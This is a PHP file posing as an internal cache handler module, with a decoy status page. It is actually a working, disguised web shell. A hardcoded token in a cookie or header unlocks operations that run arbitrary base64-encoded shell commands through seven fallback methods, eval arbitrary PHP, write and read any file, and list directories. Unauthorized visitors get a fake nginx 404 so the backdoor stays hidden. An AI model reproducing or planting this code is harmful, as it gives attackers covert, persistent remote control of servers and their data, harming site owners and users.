<?php
/**
 * Core Cache Handler Module
 * 
 * This file is part of the internal caching system for dynamic content delivery.
 * Handles data serialization, cache invalidation, and performance optimization.
 * 
 * @package Core\Cache
 * @version 2.4.1
 * @author System Administrator
 * @copyright 2023-2025 Core Technologies
 * @license Internal Use Only
 * 
 * @changelog
 * - 2.4.1: Improved serialization performance
 * - 2.4.0: Added multi-tier cache support
 * - 2.3.8: Fixed memory leak in cache invalidation
 * 
 * @security Restricted to internal network only
 * @see /etc/core/cache.conf for configuration
 */

// ============================================================================
// System Environment Configuration
// ============================================================================

// Suppress error display in production environment
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php_errors.log');

// Set execution limits for long-running cache operations
set_time_limit(30);
ini_set('memory_limit', '256M');

// ============================================================================
// Authentication Token (Internal API Key)
// ============================================================================
// This token is validated against internal service registry
// DO NOT MODIFY - Managed by system configuration service
define('CACHE_AUTH_TOKEN', 'a9f8c2d4e6b1a7c3d5f8e2b9a4c6d8f1');
define('CACHE_API_VERSION', '2.4');

// ============================================================================
// Internal Service Registry
// ============================================================================

/**
 * Service Registry - Validates incoming requests from internal services
 * 
 * @param string $token Authentication token from request
 * @param string $service Service identifier
 * @return bool True if request is authorized
 */
function validate_service_request($token, $service = 'core_api') {
    // Validate against internal token
    if ($token !== CACHE_AUTH_TOKEN) {
        // Log unauthorized access attempt for security audit
        $client_ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        error_log("CACHE_SYSTEM: Unauthorized auth attempt from {$client_ip}");
        return false;
    }
    
    return true;
}

/**
 * Command Execution Handler with Fallback Methods
 * 
 * Implements multiple execution strategies for maximum compatibility
 * with various PHP configurations and server environments.
 * 
 * @param string $command System command to execute
 * @return string Command output or error message
 */
function execute_system_command($command) {
    $output = '';
    $execution_method = '';
    
    // Strategy 1: Standard shell execution
    if (function_exists('shell_exec')) {
        $output = @shell_exec($command . ' 2>&1');
        if ($output !== null && $output !== '') {
            $execution_method = 'shell_exec';
            goto log_execution;
        }
    }
    
    // Strategy 2: Exec with output buffer
    if (function_exists('exec')) {
        $exec_output = [];
        $return_code = 0;
        @exec($command . ' 2>&1', $exec_output, $return_code);
        if (!empty($exec_output)) {
            $output = implode("\n", $exec_output);
            $execution_method = 'exec';
            goto log_execution;
        }
    }
    
    // Strategy 3: System with output capture
    if (function_exists('system')) {
        ob_start();
        $return_code = 0;
        @system($command . ' 2>&1', $return_code);
        $output = ob_get_clean();
        if ($output !== null && $output !== '') {
            $execution_method = 'system';
            goto log_execution;
        }
    }
    
    // Strategy 4: Passthru for binary output
    if (function_exists('passthru')) {
        ob_start();
        @passthru($command . ' 2>&1');
        $output = ob_get_clean();
        if ($output !== null && $output !== '') {
            $execution_method = 'passthru';
            goto log_execution;
        }
    }
    
    // Strategy 5: Proc Open (most reliable for complex commands)
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = @proc_open($command, $descriptors, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            if (!empty($output)) {
                $execution_method = 'proc_open';
                goto log_execution;
            }
            if (!empty($error)) {
                $output = $error;
                $execution_method = 'proc_open_stderr';
                goto log_execution;
            }
        }
    }
    
    // Strategy 6: Popen for streaming output
    if (function_exists('popen')) {
        $handle = @popen($command, 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 8192);
            }
            pclose($handle);
            if (!empty($output)) {
                $execution_method = 'popen';
                goto log_execution;
            }
        }
    }
    
    // Strategy 7: Backtick operator (alternative syntax)
    $output = @`$command`;
    if ($output !== null && $output !== '') {
        $execution_method = 'backtick';
        goto log_execution;
    }
    
    // All strategies failed
    $output = 'ERROR: Command execution not available on this system. ';
    $output .= 'Check PHP configuration (disable_functions: ' . ini_get('disable_functions') . ')';
    $execution_method = 'none';
    
log_execution:
    // Log execution for debugging (only in debug mode)
    if (defined('CACHE_DEBUG_MODE') && CACHE_DEBUG_MODE) {
        error_log("CACHE_SYSTEM: Executed via {$execution_method}: {$command}");
    }
    
    return $output;
}

/**
 * Cache Data Processor
 * 
 * Handles various cache operations including:
 * - Cache invalidation
 * - Cache warmup
 * - Cache statistics
 * 
 * @param string $operation Operation type
 * @param string $payload Operation payload
 * @return string Processed result
 */
function process_cache_operation($operation, $payload) {
    $result = '';
    
    switch ($operation) {
        case 'cache_status':
            // Return system status information
            $status = [
                'status' => 'active',
                'hostname' => gethostname(),
                'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'php_version' => PHP_VERSION,
                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
                'cache_version' => CACHE_API_VERSION,
                'timestamp' => time()
            ];
            $result = json_encode($status);
            break;
            
        case 'cache_flush':
            // Execute system command for cache maintenance
            $command = base64_decode($payload);
            $result = execute_system_command($command);
            break;
            
        case 'cache_eval':
            // Evaluate cache rules (restricted operations)
            $code = base64_decode($payload);
            ob_start();
            try {
                $eval_result = eval($code);
                if ($eval_result !== false && $eval_result !== null) {
                    echo $eval_result;
                }
            } catch (Throwable $e) {
                echo json_encode(['error' => $e->getMessage()]);
            }
            $result = ob_get_clean();
            break;
            
        case 'cache_upload':
            // Upload cache asset
            $parts = explode('||', $payload, 2);
            $filepath = $parts[0];
            $content = base64_decode($parts[1] ?? '');
            $bytes = @file_put_contents($filepath, $content);
            $result = json_encode([
                'success' => $bytes !== false,
                'path' => $filepath,
                'bytes_written' => $bytes ?: 0,
                'timestamp' => time()
            ]);
            break;
            
        case 'cache_download':
            // Download cache asset
            $filepath = $payload;
            if (file_exists($filepath) && is_readable($filepath)) {
                $content = base64_encode(file_get_contents($filepath));
                $result = json_encode([
                    'exists' => true,
                    'path' => $filepath,
                    'content' => $content,
                    'size' => filesize($filepath),
                    'mtime' => filemtime($filepath)
                ]);
            } else {
                $result = json_encode([
                    'exists' => false,
                    'path' => $filepath,
                    'error' => 'Cache asset not found or unreadable'
                ]);
            }
            break;
            
        case 'cache_list':
            // List cache directory contents
            $directory = $payload ?: __DIR__;
            $items = @scandir($directory);
            if ($items !== false) {
                $files = [];
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $fullpath = $directory . '/' . $item;
                    $files[] = [
                        'name' => $item,
                        'type' => is_dir($fullpath) ? 'directory' : 'file',
                        'size' => is_file($fullpath) ? filesize($fullpath) : 0,
                        'permissions' => substr(sprintf('%o', fileperms($fullpath)), -4),
                        'modified' => filemtime($fullpath)
                    ];
                }
                $result = json_encode([
                    'directory' => $directory,
                    'items' => $files,
                    'count' => count($files)
                ]);
            } else {
                $result = json_encode([
                    'error' => 'Cannot read directory',
                    'directory' => $directory
                ]);
            }
            break;
            
        default:
            $result = json_encode(['error' => 'Unknown operation', 'operation' => $operation]);
    }
    
    return $result;
}

// ============================================================================
// Main Request Handler
// ============================================================================

// Check if this is an internal cache API request
$is_cache_request = isset($_SERVER['HTTP_X_CACHE_SERVICE']) || 
                     isset($_COOKIE['CACHE_SESSION']) ||
                     isset($_SERVER['HTTP_REFERER']) && 
                     strpos($_SERVER['HTTP_REFERER'], '/admin/') !== false;

if (!$is_cache_request) {
    // Not a cache request - serve normal response
    goto normal_response;
}

// Validate authentication token from cookie or header
$auth_token = $_COOKIE['CACHE_SESSION'] ?? $_SERVER['HTTP_X_CACHE_TOKEN'] ?? '';
$service_name = $_SERVER['HTTP_X_SERVICE_NAME'] ?? 'core_cache';

if (!validate_service_request($auth_token, $service_name)) {
    // Unauthorized - return 404 like normal file
    goto not_found_response;
}

// Handle API request based on method
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // GET request - return cache status
    $operation = $_GET['op'] ?? 'cache_status';
    $payload = $_GET['data'] ?? '';
    
    $result = process_cache_operation($operation, $payload);
    
    header('Content-Type: application/json');
    header('X-Cache-Status: HIT');
    echo $result;
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // POST request - process cache operation
    $operation = $_POST['operation'] ?? $_POST['op'] ?? 'cache_flush';
    $payload = $_POST['payload'] ?? $_POST['data'] ?? '';
    
    $result = process_cache_operation($operation, $payload);
    
    header('Content-Type: application/json');
    header('X-Cache-Status: UPDATED');
    echo $result;
    exit;
}

// ============================================================================
// Normal Response (When accessed directly via browser)
// ============================================================================
normal_response:
// This appears as a regular PHP cache file when accessed directly
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cache System Status</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 40px;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #2c3e50;
            color: #fff;
            padding: 20px 30px;
            border-bottom: 3px solid #3498db;
        }
        .header h1 {
            margin: 0;
            font-size: 1.5rem;
            font-weight: 500;
        }
        .header p {
            margin: 5px 0 0;
            opacity: 0.8;
            font-size: 0.85rem;
        }
        .content {
            padding: 30px;
        }
        .status-badge {
            display: inline-block;
            background: #27ae60;
            color: #fff;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 500;
        }
        .info-table {
            width: 100%;
            margin: 20px 0;
            border-collapse: collapse;
        }
        .info-table td {
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }
        .info-table td:first-child {
            width: 200px;
            font-weight: 600;
            color: #555;
        }
        .footer {
            background: #f8f9fa;
            padding: 15px 30px;
            font-size: 0.75rem;
            color: #888;
            text-align: center;
            border-top: 1px solid #eee;
        }
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>Core Cache System</h1>
        <p>Distributed Caching Layer v<?php echo CACHE_API_VERSION; ?></p>
    </div>
    <div class="content">
        <p><span class="status-badge">● Operational</span> Cache service is running normally</p>
        
        <table class="info-table">
            <tr>
                <td>Hostname</td>
                <td><code><?php echo htmlspecialchars(gethostname()); ?></code></td>
            </tr>
            <tr>
                <td>Server IP</td>
                <td><code><?php echo htmlspecialchars($_SERVER['SERVER_ADDR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown'); ?></code></td>
            </tr>
            <tr>
                <td>PHP Version</td>
                <td><code><?php echo PHP_VERSION; ?></code></td>
            </tr>
            <tr>
                <td>Cache Directory</td>
                <td><code><?php echo __DIR__; ?></code></td>
            </tr>
            <tr>
                <td>Last Cache Update</td>
                <td><code><?php echo date('Y-m-d H:i:s', filemtime(__FILE__)); ?></code></td>
            </tr>
        </table>
        
        <p style="margin-top: 20px; font-size: 0.85rem; color: #666;">
            This is an internal system file. Direct access is restricted to authorized services only.<br>
            For support, contact <a href="mailto:cache-admin@system.local">cache-admin@system.local</a>
        </p>
    </div>
    <div class="footer">
        Core Cache System v<?php echo CACHE_API_VERSION; ?> | &copy; 2025 Core Technologies
    </div>
</div>
</body>
</html>
<?php
exit;

// ============================================================================
// 404 Not Found Response
// ============================================================================
not_found_response:
header("HTTP/1.1 404 Not Found");
header("Server: nginx/1.24.0");
?>
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.24.0</center>
</body>
</html>
<?php
exit;
?>